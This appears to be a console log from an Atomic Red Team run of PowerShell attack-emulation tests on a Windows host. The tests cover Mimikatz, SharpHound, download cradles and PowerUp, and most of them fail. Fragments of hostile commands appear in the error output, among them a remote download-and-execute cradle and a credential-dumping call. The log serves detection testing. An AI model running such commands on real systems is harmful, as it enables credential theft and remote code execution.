@@ -1,0 +1,622 @@
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+                                                                                                                                                               Executing test: T1059.001-1 Mimikatz                                                                                                                           Import-Module : The specified module 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1'                                            was not loaded because no valid module file was found in any module directory.                                                                                 At line:1 char:4                                                                                                                                               + & {Import-Module "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Powers ...                                                                                    +    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                            + CategoryInfo          : ResourceUnavailable: (C:\AtomicRedTea...ke-Mimikatz.ps1:String) [Import-Module], FileNot                                            FoundException
+    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand
+
+Invoke-Mimikatz : The term 'Invoke-Mimikatz' is not recognized as the name of a cmdlet, function, script file, or                                              operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try                                           again.                                                                                                                                                         At line:2 char:1                                                                                                                                               + Invoke-Mimikatz -DumpCreds}                                                                                                                                  + ~~~~~~~~~~~~~~~                                                                                                                                                  + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], CommandNotFoundException                                                                + FullyQualifiedErrorId : CommandNotFoundException                                                                                                         Exit code: 0                                                                                                                                                   Done executing test: T1059.001-1 Mimikatz                                                                                                                      Executing test: T1059.001-2 Run BloodHound from local disk                                                                                                     ----------------------------------------------                                                                                                                 Initializing SharpHound at 5:05 PM on 9/8/2026                                                                                                                 ----------------------------------------------                                                                                                                 Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+System.DirectoryServices.ActiveDirectory.ActiveDirectoryOperationException: Current security context is not associated with an Active Directory domain or forest.
+   at System.DirectoryServices.ActiveDirectory.DirectoryContext.GetLoggedOnDomain()
+   at System.DirectoryServices.ActiveDirectory.DirectoryContext.IsContextValid(DirectoryContext context, DirectoryContextType contextType)
+   at System.DirectoryServices.ActiveDirectory.DirectoryContext.isDomain()
+   at System.DirectoryServices.ActiveDirectory.Domain.GetDomain(DirectoryContext context)
+   at SharpHound3.SharpHound.<Main>d__0.MoveNext()
+Unable to determine user's domain. Please manually specify it with the --domain flag
+Exit code: 0
+Done executing test: T1059.001-2 Run BloodHound from local disk
+Executing test: T1059.001-3 Run Bloodhound from Memory using Download Cradle
+Remote download of SharpHound.ps1 into memory, followed by execution of the script
+----------------------------------------------
+Initializing SharpHound at 5:05 PM on 9/8/2026
+----------------------------------------------
+Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+System.DirectoryServices.ActiveDirectory.ActiveDirectoryOperationException: Current security context is not associated with an Active Directory domain or forest.                                                                                                                                                                at System.DirectoryServices.ActiveDirectory.DirectoryContext.GetLoggedOnDomain()                                                                               at System.DirectoryServices.ActiveDirectory.DirectoryContext.IsContextValid(DirectoryContext context, DirectoryContextType contextType)                        at System.DirectoryServices.ActiveDirectory.DirectoryContext.isDomain()                                                                                        at System.DirectoryServices.ActiveDirectory.Domain.GetDomain(DirectoryContext context)                                                                         at SharpHound3.SharpHound.<Main>d__0.MoveNext()                                                                                                             Unable to determine user's domain. Please manually specify it with the --domain flag                                                                           Exit code: 0                                                                                                                                                   Done executing test: T1059.001-3 Run Bloodhound from Memory using Download Cradle
+Executing test: T1059.001-4 Mimikatz - Cradlecraft PsSendKeys
+Process Timed out after 120 seconds, use '-TimeoutSeconds' to specify a different timeout
+Get-ItemProperty : Cannot find path 'HKCU:\Software\Microsoft\Notepad' because it does not exist.
+At line:1 char:254
++ ... crosoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void] ...
++                                             ~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\Microsoft\Notepad:String) [Get-ItemProperty], ItemNotFou
+   ndException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemPropertyCommand
+                                                                                                                                                               SP : Cannot find path 'HKCU:\Software\Microsoft\Notepad' because it does not exist.                                                                            At line:1 char:484                                                                                                                                             + ... 0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]} ...                                                                                +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                         + CategoryInfo          : ObjectNotFound: (HKCU:\Software\Microsoft\Notepad:String) [Set-ItemProperty], ItemNotFou                                            ndException                                                                                                                                                     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand                                                                                                                                                                                                                               SP : Cannot find path 'HKCU:\Software\Microsoft\Notepad' because it does not exist.                                                                            At line:1 char:484                                                                                                                                             +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                     + ... 0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]} ...                                                                                    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\Microsoft\Notepad:String) [Set-ItemProperty], ItemNotFou                                            ndException                                                                                                                                                     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand                                                                Exit code: -1                                                                                                                                                  Done executing test: T1059.001-4 Mimikatz - Cradlecraft PsSendKeys                                                                                             Executing test: T1059.001-5 Invoke-AppPathBypass                                                                                                               Exception calling "DownloadString" with "1" argument(s): "The remote server returned an error: (503) Server                                                    Unavailable."                                                                                                                                                  At line:1 char:1                                                                                                                                               + IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser ...                                                                                    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                            + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException                                                                                      + FullyQualifiedErrorId : WebException                                                                                                                                                                                                                                                                                    Invoke-AppPathBypass : The term 'Invoke-AppPathBypass' is not recognized as the name of a cmdlet, function, script                                             file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct                                          and try again.                                                                                                                                                 At line:1 char:183                                                                                                                                             + ... 0dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payloa ...                                                                                +                                              ~~~~~~~~~~~~~~~~~~~~                                                                                                + CategoryInfo          : ObjectNotFound: (Invoke-AppPathBypass:String) [], CommandNotFoundException                                                           + FullyQualifiedErrorId : CommandNotFoundException                                                                                                         Exit code: 1                                                                                                                                                   Done executing test: T1059.001-5 Invoke-AppPathBypass                                                                                                          Executing test: T1059.001-6 Powershell MsXml COM object - with prompt                                                                                          2026-09-08T17:08:01 Download Cradle test success!                                                                                                              Exit code: 0                                                                                                                                                   Done executing test: T1059.001-6 Powershell MsXml COM object - with prompt                                                                                     Executing test: T1059.001-7 Powershell XML requests                                                                                                            'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml' is not recognized as an internal or external command,
+operable program or batch file.
+Exit code: 255                                                                                                                                                 Done executing test: T1059.001-7 Powershell XML requests                                                                                                       Executing test: T1059.001-8 Powershell invoke mshta.exe download                                                                                               Exit code: 0                                                                                                                                                   Done executing test: T1059.001-8 Powershell invoke mshta.exe download                                                                                          Executing test: T1059.001-10 PowerShell Fileless Script Execution                                                                                              The operation completed successfully.                                                                                                                          Exit code: 0                                                                                                                                                   Done executing test: T1059.001-10 PowerShell Fileless Script Execution                                                                                         Executing test: T1059.001-11 NTFS Alternate Data Stream Access                                                                                                 Invoke-Expression : Cannot convert 'System.Object[]' to the type 'System.String' required by parameter 'Command'.                                              Specified method is not supported.                                                                                                                             At line:3 char:19                                                                                                                                              + Invoke-Expression $streamcommand}                                                                                                                            +                   ~~~~~~~~~~~~~~                                                                                                                                 + CategoryInfo          : InvalidArgument: (:) [Invoke-Expression], ParameterBindingException                                                                  + FullyQualifiedErrorId : CannotConvertArgument,Microsoft.PowerShell.Commands.InvokeExpressionCommand                                                      Exit code: 0
+Done executing test: T1059.001-11 NTFS Alternate Data Stream Access
+Executing test: T1059.001-12 PowerShell Session Creation and Use
+Source        Destination     IPV4Address      IPV6Address                              Bytes    Time(ms)
+------        -----------     -----------      -----------                              -----    --------
+DESKTOP-0R... DESKTOP-0R0EQ17 192.168.218.135  fe80::5eef:e64c:d19e:4e2d%15             32       0
+DESKTOP-0R... DESKTOP-0R0EQ17 192.168.218.135  fe80::5eef:e64c:d19e:4e2d%15             32       0                                                             DESKTOP-0R... DESKTOP-0R0EQ17 192.168.218.135  fe80::5eef:e64c:d19e:4e2d%15             32       0                                                             DESKTOP-0R... DESKTOP-0R0EQ17 192.168.218.135  fe80::5eef:e64c:d19e:4e2d%15             32       0                                                             T1086 PowerShell Session Creation and Use                                                                                                                      New-PSSession : [DESKTOP-0R0EQ17] Connecting to remote server DESKTOP-0R0EQ17 failed with the following error message                                          : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic.                                                                     At line:1 char:4                                                                                                                                               + & {New-PSSession -ComputerName $env:COMPUTERNAME                                                                                                             +    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                 + CategoryInfo          : OpenError: (System.Manageme....RemoteRunspace:RemoteRunspace) [New-PSSession], PSRemotin                                            gTransportException                                                                                                                                             + FullyQualifiedErrorId : AccessDenied,PSSessionOpenFailed                                                                                                 Exit code: 0                                                                                                                                                   Done executing test: T1059.001-12 PowerShell Session Creation and Use                                                                                          Executing test: T1059.001-13 ATHPowerShellCommandLineParameter -Command parameter variations                                                                   TechniqueID : T1059.001                                                                                                                                        TestSuccess : True                                                                                                                                             TestGuid    : 2e510f94-ea80-4421-b210-2be0bf0d910b                                                                                                             ProcessId   : 8364
+CommandLine : powershell.exe -NoProfile -C Write-Host 2e510f94-ea80-4421-b210-2be0bf0d910b
+Exit code: 0
+Done executing test: T1059.001-13 ATHPowerShellCommandLineParameter -Command parameter variations
+Executing test: T1059.001-14 ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
+TechniqueID : T1059.001
+TestSuccess : True
+TestGuid    : 026cc714-c85e-4ad6-bca0-4a4767c08c01                                                                                                             ProcessId   : 12716                                                                                                                                            CommandLine : powershell.exe -NoProfile -EA PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgB                                                      zAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABl                                                      AGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUA                                                      E4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG                                                      4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQ                                                      APAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgAwADIA                                                      NgBjAGMANwAxADQALQBjADgANQBlAC0ANABhAGQANgAtAGIAYwBhADAALQA0AGEANAA3ADYANwBjADAAOABjADAAMQA8AC8AUwA+AA0AC                                                      gAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -C Write-Host $args[0]                                           Exit code: 0
+Done executing test: T1059.001-14 ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
+Executing test: T1059.001-15 ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
+TechniqueID : T1059.001
+TestSuccess : True
+TestGuid    : bef05354-56a1-410b-9a93-b236f0151677
+ProcessId   : 11632                                                                                                                                            CommandLine : powershell.exe -NoProfile -E VwByAGkAdABlAC0ASABvAHMAdAAgAGIAZQBmADAANQAzADUANAAtADUANgBhADEALQA0ADEAMABi                                                      AC0AOQBhADkAMwAtAGIAMgAzADYAZgAwADEANQAxADYANwA3AA==                                                                                             Exit code: 0                                                                                                                                                   Done executing test: T1059.001-15 ATHPowerShellCommandLineParameter -EncodedCommand parameter variations                                                       Executing test: T1059.001-16 ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments                                     TechniqueID : T1059.001                                                                                                                                        TestSuccess : True                                                                                                                                             TestGuid    : 6090e9eb-70c4-4592-ba57-e7bc3a19e304                                                                                                             ProcessId   : 5192
+CommandLine : powershell.exe -NoProfile -EncodedArguments PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiA
+              CAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAH
+              cAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACA
+              AIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwA
+              ZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4AT
+              wBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIA
+              A8AFMAPgA2ADAAOQAwAGUAOQBlAGIALQA3ADAAYwA0AC0ANAA1ADkAMgAtAGIAYQA1ADcALQBlADcAYgBjADMAYQAxADkAZQAzADAANAA
+              8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -E
+              VwByAGkAdABlAC0ASABvAHMAdAAgACQAYQByAGcAcwBbADAAXQA=
+Exit code: 0
+Done executing test: T1059.001-16 ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
+Executing test: T1059.001-17 PowerShell Command Execution
+Hello, from PowerShell!
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="information" RefId="2"><TN RefId="1"><T>System.Management.Automation.InformationRecord</T><T>System.Object</T></TN><ToString>Hello, from PowerShell!</ToString><Props><Obj N="MessageData" RefId="3"><TN RefId="2"><T>System.Management.Automation.HostInformationMessage</T><T>System.Object</T></TN><ToString>Hello, from PowerShell!</ToString><Props><S N="Message">Hello, from PowerShell!</S><B N="NoNewLine">false</B><S N="ForegroundColor">Gray</S><S N="BackgroundColor">Black</S></Props></Obj><S N="Source">Write-Host</S><DT N="TimeGenerated">2026-09-08T17:09:21.92317+03:00</DT><Obj N="Tags" RefId="4"><TN RefId="3"><T>System.Collections.Generic.List`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</T><T>System.Object</T></TN><LST><S>PSHOST</S></LST></Obj><S N="User">DESKTOP-0R0EQ17\Qween</S><S N="Computer">DESKTOP-0R0EQ17</S><U32 N="ProcessId">13060</U32><U32 N="NativeThreadId">13984</U32><U32 N="ManagedThreadId">9</U32></Props></Obj></Objs>
+Exit code: 0
+Done executing test: T1059.001-17 PowerShell Command Execution
+Executing test: T1059.001-18 PowerShell Invoke Known Malicious Cmdlets
+function Add-Persistence { Write-Host Pretending to invoke Add-Persistence }
+function Find-AVSignature { Write-Host Pretending to invoke Find-AVSignature }
+function Get-GPPAutologon { Write-Host Pretending to invoke Get-GPPAutologon }
+function Get-GPPPassword { Write-Host Pretending to invoke Get-GPPPassword }
+function Get-HttpStatus { Write-Host Pretending to invoke Get-HttpStatus }
+function Get-Keystrokes { Write-Host Pretending to invoke Get-Keystrokes }
+function Get-SecurityPackages { Write-Host Pretending to invoke Get-SecurityPackages }
+function Get-TimedScreenshot { Write-Host Pretending to invoke Get-TimedScreenshot }
+function Get-VaultCredential { Write-Host Pretending to invoke Get-VaultCredential }
+function Get-VolumeShadowCopy { Write-Host Pretending to invoke Get-VolumeShadowCopy }
+function Install-SSP { Write-Host Pretending to invoke Install-SSP }
+function Invoke-CredentialInjection { Write-Host Pretending to invoke Invoke-CredentialInjection }
+function Invoke-DllInjection { Write-Host Pretending to invoke Invoke-DllInjection }
+function Invoke-Mimikatz { Write-Host Pretending to invoke Invoke-Mimikatz }
+function Invoke-NinjaCopy { Write-Host Pretending to invoke Invoke-NinjaCopy }
+function Invoke-Portscan { Write-Host Pretending to invoke Invoke-Portscan }
+function Invoke-ReflectivePEInjection { Write-Host Pretending to invoke Invoke-ReflectivePEInjection }
+function Invoke-ReverseDnsLookup { Write-Host Pretending to invoke Invoke-ReverseDnsLookup }
+function Invoke-Shellcode { Write-Host Pretending to invoke Invoke-Shellcode }
+function Invoke-TokenManipulation { Write-Host Pretending to invoke Invoke-TokenManipulation }
+function Invoke-WmiCommand { Write-Host Pretending to invoke Invoke-WmiCommand }
+function Mount-VolumeShadowCopy { Write-Host Pretending to invoke Mount-VolumeShadowCopy }
+function New-ElevatedPersistenceOption { Write-Host Pretending to invoke New-ElevatedPersistenceOption }
+function New-UserPersistenceOption { Write-Host Pretending to invoke New-UserPersistenceOption }
+function New-VolumeShadowCopy { Write-Host Pretending to invoke New-VolumeShadowCopy }
+function Out-CompressedDll { Write-Host Pretending to invoke Out-CompressedDll }
+function Out-EncodedCommand { Write-Host Pretending to invoke Out-EncodedCommand }
+function Out-EncryptedScript { Write-Host Pretending to invoke Out-EncryptedScript }
+function Out-Minidump { Write-Host Pretending to invoke Out-Minidump }
+function PowerUp { Write-Host Pretending to invoke PowerUp }
+function PowerView { Write-Host Pretending to invoke PowerView }
+function Remove-Comments { Write-Host Pretending to invoke Remove-Comments }
+function Remove-VolumeShadowCopy { Write-Host Pretending to invoke Remove-VolumeShadowCopy }
+function Set-CriticalProcess { Write-Host Pretending to invoke Set-CriticalProcess }
+function Set-MasterBootRecord { Write-Host Pretending to invoke Set-MasterBootRecord }
+Add-Persistence                                                                                                                                                Find-AVSignature                                                                                                                                               Get-GPPAutologon                                                                                                                                               Get-GPPPassword                                                                                                                                                Get-HttpStatus                                                                                                                                                 Get-Keystrokes                                                                                                                                                 Get-SecurityPackages                                                                                                                                           Get-TimedScreenshot                                                                                                                                            Get-VaultCredential                                                                                                                                            Get-VolumeShadowCopy                                                                                                                                           Install-SSP
+Invoke-CredentialInjection
+Invoke-DllInjection
+Invoke-Mimikatz
+Invoke-NinjaCopy
+Invoke-Portscan
+Invoke-ReflectivePEInjection
+Invoke-ReverseDnsLookup
+Invoke-Shellcode
+Invoke-TokenManipulation
+Invoke-WmiCommand
+Mount-VolumeShadowCopy
+New-ElevatedPersistenceOption
+New-UserPersistenceOption
+New-VolumeShadowCopy
+Out-CompressedDll
+Out-EncodedCommand
+Out-EncryptedScript
+Out-Minidump
+PowerUp
+PowerView
+Remove-Comments
+Remove-VolumeShadowCopy
+Set-CriticalProcess
+Set-MasterBootRecord
+Exit code: 0
+Done executing test: T1059.001-18 PowerShell Invoke Known Malicious Cmdlets
+Executing test: T1059.001-19 PowerUp Invoke-AllChecks
+Process Timed out after 120 seconds, use '-TimeoutSeconds' to specify a different timeout
+Check
+-----
+User Has Local Admin Privileges
+User In Local Group with Admin Privileges
+Process Token Privileges
+Process Token Privileges
+Process Token Privileges
+Process Token Privileges
+Process Token Privileges
+Process Token Privileges
+Process Token Privileges
+Process Token Privileges
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
